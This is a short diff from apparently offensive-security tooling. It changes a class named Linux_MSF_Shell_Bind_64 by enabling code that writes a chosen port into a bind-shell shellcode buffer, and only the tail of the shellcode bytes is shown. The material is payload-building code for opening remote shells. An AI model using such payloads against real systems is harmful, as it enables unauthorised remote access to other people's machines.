@@ -105,9 +105,9 @@ bool Linux_MSF_Shell_Bind_64::initPayload()
     "\x05\xff\xe6";
 
 	/// Change port number
-//	unsigned char up = port / 256, down = port % 256;
-    //buf[20] = up;
-    //buf[21] = down;
+    unsigned char up = port / 256, down = port % 256;
+    buf[20] = up;
+    buf[21] = down;
 	int buf_len = 78;
 
     payload_size = buf_len;
